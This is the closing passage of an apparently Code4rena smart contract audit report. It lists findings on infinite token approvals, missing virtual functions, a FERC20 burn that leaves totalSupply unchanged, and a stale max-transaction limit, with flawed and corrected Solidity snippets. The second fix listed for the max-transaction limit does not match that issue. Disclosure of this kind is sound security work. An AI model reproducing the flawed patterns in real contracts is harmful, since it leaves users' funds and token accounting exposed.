<h3 style="position:relative;" id="recommended-mitigation-steps-37"><a class="anchor before" aria-label="recommended mitigation steps 37 permalink" href="#recommended-mitigation-steps-37"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>If the intent is to enforce a real-world time window, the contract should:</p>
<ul>
<li>Accept a client-supplied timestamp of when the transaction was initiated and compare <code>block.timestamp</code> to that value plus the allowed window.</li>
<li>Alternatively, use off-chain logic to cancel or replace transactions that are not mined within the desired time frame.</li>
<li>At minimum, document this limitation in the contract and user documentation to avoid misunderstanding.</li>
</ul>
<h2 style="position:relative;" id="08-widespread-use-of-infinite-token-approvals"><a class="anchor before" aria-label="08 widespread use of infinite token approvals permalink" href="#08-widespread-use-of-infinite-token-approvals"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[08] Widespread use of infinite token approvals</h2>
<p>The protocol makes extensive use of infinite token approvals (<code>type(uint256).max</code>) across multiple contracts. While this is a common pattern in DeFi to save gas on repeated approvals, it can pose risks with certain token implementations. Examples include:</p>
<p><strong>BondingTax.sol:</strong></p>
<pre data-index="140" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">taxToken</span><span class="mtk1">).</span><span class="mtk11">forceApprove</span><span class="mtk1">(</span><span class="mtk12">router_</span><span class="mtk1">, </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span></code></pre>
<p><strong>AgentMigrator.sol:</strong></p>
<pre data-index="141" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">lp</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">veToken</span><span class="mtk1">, </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span></code></pre>
<p><strong>AgentFactory.sol:</strong></p>
<pre data-index="142" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">lp</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">veToken</span><span class="mtk1">, </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span></code></pre>
<p><strong>AeroAdaptor.sol:</strong></p>
<pre data-index="143" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">tokenIn</span><span class="mtk1">).</span><span class="mtk11">forceApprove</span><span class="mtk1">(</span><span class="mtk12">router_</span><span class="mtk1">, </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span></code></pre>
<h3 style="position:relative;" id="impact-21"><a class="anchor before" aria-label="impact 21 permalink" href="#impact-21"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Some ERC20 tokens (like COMP) may downcast the approval value to a smaller type (e.g., <code>uint96</code>) rather than treating it as infinite. This can lead to:</p>
<ol>
<li>Potential transaction failures if tokens downcast the approval value.</li>
<li>Increased risk if a spender contract is compromised, as they have unlimited approval.</li>
<li>Unnecessary exposure to risk when large approvals aren’t needed.</li>
<li>Gas wastage when approvals need to be reset due to downcasting.</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-38"><a class="anchor before" aria-label="recommended mitigation steps 38 permalink" href="#recommended-mitigation-steps-38"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<ol>
<li>Use exact approval amounts instead of <code>type(uint256).max</code> where possible.</li>
<li>
<p>If infinite approvals are necessary for gas optimization:</p>
<ul>
<li>Add a function to revoke approvals when they’re no longer needed.</li>
<li>Document which tokens are known to be compatible/incompatible.</li>
<li>Consider implementing approval amount checks for known problematic tokens.</li>
</ul>
</li>
<li>For critical operations, consider implementing a pattern where approvals are set and used in the same transaction.</li>
</ol>
<h2 style="position:relative;" id="09-missing-virtual-functions-for-inheritance"><a class="anchor before" aria-label="09 missing virtual functions for inheritance permalink" href="#09-missing-virtual-functions-for-inheritance"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[09] Missing <code>virtual</code> functions for inheritance</h2>
<p>Several internal functions across the codebase that are likely to need customization in derived contracts are not marked as <code>virtual</code>. This limits the ability to properly override these functions in inherited contracts and could force developers to duplicate code instead of extending it.</p>
<p>Example patterns that should be <code>virtual</code> include:</p>
<ul>
<li>Internal hooks for token operations</li>
<li>State modification functions</li>
<li>Validation functions</li>
</ul>
<h3 style="position:relative;" id="impact-22"><a class="anchor before" aria-label="impact 22 permalink" href="#impact-22"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ol>
<li>Reduced code reusability.</li>
<li>Potential code duplication in derived contracts.</li>
<li>Increased maintenance burden when changes are needed.</li>
<li>Risk of bugs when developers are forced to copy and modify code instead of properly inheriting.</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-39"><a class="anchor before" aria-label="recommended mitigation steps 39 permalink" href="#recommended-mitigation-steps-39"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<ol>
<li>Audit internal functions and mark appropriate ones as <code>virtual</code>.</li>
<li>Add proper documentation for overrideable functions.</li>
<li>Consider creating explicit hooks for key operations.</li>
<li>Follow the Open-Closed Principle: design for extension.</li>
</ol>
<h2 style="position:relative;" id="10-totalsupply-not-updated-on-burning-in-ferc20"><a class="anchor before" aria-label="10 totalsupply not updated on burning in ferc20 permalink" href="#10-totalsupply-not-updated-on-burning-in-ferc20"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[10] <code>totalSupply</code> not updated on burning in <code>FERC20</code></h2>
<p>The <code>FERC20</code> contract’s <code>burnFrom</code> function reduces the user’s balance but does not decrease <code>_totalSupply</code>. This breaks ERC20 compliance and causes <code>totalSupply()</code> to report incorrect values after burns.</p>
<p>The root cause is in the <code>burnFrom</code> function implementation:</p>
<pre data-index="144" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">burnFrom</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Invalid address"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_balances</span><span class="mtk1">[</span><span class="mtk12">user</span><span class="mtk1">] = </span><span class="mtk12">_balances</span><span class="mtk1">[</span><span class="mtk12">user</span><span class="mtk1">] - </span><span class="mtk12">amount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Transfer</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This function only modifies the user’s balance but fails to update the <code>totalSupply</code>, unlike standard ERC20 implementations where burning tokens should reduce both the user’s balance and the <code>totalSupply</code>.</p>
<h3 style="position:relative;" id="impact-23"><a class="anchor before" aria-label="impact 23 permalink" href="#impact-23"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Inaccurate token economics: the reported <code>totalSupply</code> will be higher than the actual circulating supply.</li>
<li>External systems relying on correct supply data will malfunction.</li>
<li>Potential price manipulation: artificially inflated supply metrics could affect token valuation.</li>
<li>Broken integrations: systems that rely on the total supply for calculations (e.g., voting power, rewards) will use incorrect values.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-40"><a class="anchor before" aria-label="recommended mitigation steps 40 permalink" href="#recommended-mitigation-steps-40"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Update the <code>burnFrom</code> function to decrease the <code>_totalSupply</code> when burning tokens:</p>
<pre data-index="145" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">burnFrom</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Invalid address"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_balances</span><span class="mtk1">[</span><span class="mtk12">user</span><span class="mtk1">] = </span><span class="mtk12">_balances</span><span class="mtk1">[</span><span class="mtk12">user</span><span class="mtk1">] - </span><span class="mtk12">amount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_totalSupply</span><span class="mtk1"> -= </span><span class="mtk12">amount</span><span class="mtk1">; </span><span class="mtk3">// Add this line to update total supply</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Transfer</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>Additionally, consider using the internal <code>_burn</code> function that already exists in the contract to avoid code duplication:</p>
<pre data-index="146" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">burnFrom</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">_burn</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Transfer</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>And update the <code>_burn</code> function to also decrease the <code>totalSupply</code>:</p>
<pre data-index="147" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_burn</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Invalid address"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_balances</span><span class="mtk1">[</span><span class="mtk12">user</span><span class="mtk1">] = </span><span class="mtk12">_balances</span><span class="mtk1">[</span><span class="mtk12">user</span><span class="mtk1">] - </span><span class="mtk12">amount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_totalSupply</span><span class="mtk1"> -= </span><span class="mtk12">amount</span><span class="mtk1">; </span><span class="mtk3">// Add this line</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h2 style="position:relative;" id="11-wrong-max-transaction-limit-after-burns"><a class="anchor before" aria-label="11 wrong max transaction limit after burns permalink" href="#11-wrong-max-transaction-limit-after-burns"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[11] Wrong max transaction limit after burns</h2>
<p>The <code>FERC20</code> contract’s <code>_maxTxAmount</code> is calculated based on the initial <code>_totalSupply</code> and is not updated when tokens are burned. This issue is compounded by the previously reported bug where <code>_totalSupply</code> is not decreased during burns. Even if the total supply bug is fixed, the max transaction limit would still need to be recalculated after burns.</p>
<p>The root cause is in the <code>_updateMaxTx</code> function, which is only called at deployment and when explicitly invoked:</p>
<pre data-index="148" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_updateMaxTx</span><span class="mtk1">(</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">_maxTx</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">maxTx</span><span class="mtk1"> = </span><span class="mtk12">_maxTx</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_maxTxAmount</span><span class="mtk1"> = (</span><span class="mtk12">maxTx</span><span class="mtk1"> * </span><span class="mtk12">_totalSupply</span><span class="mtk1">) / </span><span class="mtk7">100</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">MaxTxUpdated</span><span class="mtk1">(</span><span class="mtk12">_maxTx</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This function is not called after burns, so <code>_maxTxAmount</code> remains tied to the original (higher) supply, allowing disproportionately large transfers relative to the actual circulating supply.</p>
<h3 style="position:relative;" id="impact-24"><a class="anchor before" aria-label="impact 24 permalink" href="#impact-24"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Incorrect enforcement of transaction limits, undermining tokenomics.</li>
<li>Anti-whale mechanisms become ineffective after burns.</li>
<li>Users can transfer larger percentages of the circulating supply than intended (up to 2x the intended percentage after 50% of supply is burned).</li>
<li>Potential market manipulation through unexpectedly large trades.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-41"><a class="anchor before" aria-label="recommended mitigation steps 41 permalink" href="#recommended-mitigation-steps-41"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>There are two approaches to fix this issue:</p>
<ol>
<li>
<p>Update <code>_maxTxAmount</code> after burns:</p>
<pre data-index="149" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">burnFrom</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Invalid address"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk12">_balances</span><span class="mtk1">[</span><span class="mtk12">user</span><span class="mtk1">] = </span><span class="mtk12">_balances</span><span class="mtk1">[</span><span class="mtk12">user</span><span class="mtk1">] - </span><span class="mtk12">amount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk12">_totalSupply</span><span class="mtk1"> -= </span><span class="mtk12">amount</span><span class="mtk1">; </span><span class="mtk3">// Fix for the first bug</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk11">_updateMaxTx</span><span class="mtk1">(</span><span class="mtk12">maxTx</span><span class="mtk1">); </span><span class="mtk3">// Recalculate _maxTxAmount based on new supply</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">Transfer</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
</li>
<li>Implement proper upgrade tests that verify storage.</li>
</ol>
<hr>
<h1 style="position:relative;" id="disclosures"><a class="anchor before" aria-label="disclosures permalink" href="#disclosures"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Disclosures</h1>
<p>C4 is an open organization governed by participants in the community.</p>
<p>C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>
<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>
<style class="grvsc-styles">
  .grvsc-container {
    overflow: auto;
    position: relative;
    -webkit-overflow-scrolling: touch;
    padding-top: 1rem;
    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));
    padding-bottom: 1rem;
    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));
    border-radius: 8px;
    border-radius: var(--grvsc-border-radius, 8px);
    font-feature-settings: normal;
    line-height: 1.4;
  }
  
  .grvsc-code {
    display: table;
  }
  
  .grvsc-line {
    display: table-row;
    box-sizing: border-box;
    width: 100%;
    position: relative;
  }
  
  .grvsc-line > * {
    position: relative;
  }
  
  .grvsc-gutter-pad {
    display: table-cell;
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  .grvsc-gutter {
    display: table-cell;
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter::before {
    content: attr(data-content);
  }
  
  .grvsc-source {
    display: table-cell;
    padding-left: 1.5rem;
    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));
